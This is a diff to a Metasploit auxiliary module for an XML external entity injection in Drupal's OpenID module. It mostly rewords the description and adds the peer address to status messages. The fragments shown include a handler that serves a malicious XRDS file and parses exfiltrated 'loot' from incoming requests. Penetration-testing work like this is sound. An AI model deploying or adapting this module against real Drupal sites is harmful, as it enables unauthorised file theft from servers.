@@ -17,10 +17,11 @@ class Metasploit3 < Msf::Auxiliary
     super(update_info(info,
       'Name'           => 'Drupal OpenID External Entity Injection',
       'Description'    => %q{
-        This module abuses a XML External Entity Injection on the OpenID module
-        from Drupal. The vulnerability exists on the parsing of a malformed XRDS
-        file coming from a malicious OpenID endpoint. This module has been tested
-        successfully in Drupal 7.15 and 7.2 with the OpenID module enabled.
+        This module abuses an XML External Entity Injection
+        vulnerability on the OpenID module from Drupal. The vulnerability exists
+        in the parsing of a malformed XRDS file coming from a malicious OpenID
+        endpoint. This module has been tested successfully on Drupal 7.15 and
+        7.2 with the OpenID module enabled.
       },
       'License'        => MSF_LICENSE,
       'Author'         =>
@@ -102,7 +103,7 @@ class Metasploit3 < Msf::Auxiliary
     res = send_openid_auth(signature)
 
     unless res
-      vprint_status("Connection timed out")
+      vprint_status("#{peer} - Connection timed out")
       return Exploit::CheckCode::Unknown
     end
 
@@ -157,12 +158,12 @@ class Metasploit3 < Msf::Auxiliary
 
   def on_request_uri(cli, request)
     if request.uri =~ /#{@prefix}/
-      vprint_status("Signature found, parsing file...")
+      vprint_status("#{peer} - Signature found, parsing file...")
       @http_loot = parse_loot(request.uri)
       return
     end
 
-    print_status("Sending XRDS...")
+    print_status("#{peer} - Sending XRDS...")
     send_response_html(cli, xrds_file, { 'Content-Type' => 'application/xrds+xml' })
   end
 
